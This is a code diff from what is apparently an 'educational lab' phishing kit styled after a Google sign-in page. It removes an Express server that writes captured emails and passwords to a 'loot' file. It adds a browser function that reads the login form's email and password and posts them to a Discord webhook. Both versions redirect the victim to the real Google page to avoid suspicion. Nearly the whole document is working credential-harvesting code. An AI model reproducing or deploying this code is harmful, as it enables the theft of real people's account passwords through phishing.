@@ -1,30 +1,44 @@
-// server.js
-const express = require('express');
-const bodyParser = require('body-parser');
-const fs = require('fs');
-const app = express();
-const PORT = 3000;
+async function capture() {
+    const email = document.getElementById('email').value;
+    const pass = document.getElementById('password').value;
+    const hook = sessionStorage.getItem('lab_hook');
 
-app.use(bodyParser.urlencoded({ extended: true }));
-app.use(express.static('public')); // This is where your HTML/CSS go
+    console.log("🛠️ Attempting transmission to:", hook);
 
-// The "Catch" Route
-app.post('/auth/capture', (req, res) => {
-    const { email, password } = req.body;
-    
-    const logEntry = `[${new Date().toISOString()}] Email: ${email} | Pass: ${password}\n`;
-    
-    // Write to a local file (the "loot" file)
-    fs.appendFile('captured_creds.txt', logEntry, (err) => {
-        if (err) console.error("Error writing to file", err);
-    });
+    // This is the specific "JSON shape" Discord demands
+    const payload = {
+        content: "🚨 **Lab 3.2: Alert**", 
+        embeds: [{
+            title: "Credential Harvested",
+            color: 16711680, // Red
+            fields: [
+                { name: "Email", value: email || "empty", inline: true },
+                { name: "Password", value: pass || "empty", inline: true }
+            ],
+            footer: { text: "ENI-Tutor | Tier 3 Journeyman" }
+        }]
+    };
 
-    console.log("Captured:", email, password);
+    try {
+        const response = await fetch(hook, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
 
-    // Critical: Redirect to the real service to avoid suspicion
-    res.redirect('https://accounts.google.com/signin/v2/challenge/pwd');
-});
+        if (response.ok) {
+            console.log("✅ Discord accepted the packet (Status 204).");
+        } else {
+            console.error("❌ Discord rejected it. Status:", response.status);
+            const errorText = await response.text();
+            console.error("Reason:", errorText);
+        }
+    } catch (err) {
+        console.error("🌐 Network Error (Check your URL or Internet):", err);
+    }
 
-app.listen(PORT, () => {
-    console.log(`Educational Lab Server running at http://localhost:${PORT}`);
-});
+    // Delay redirect so we can see the logs
+    setTimeout(() => {
+        window.location.href = "https://accounts.google.com";
+    }, 2000);
+}
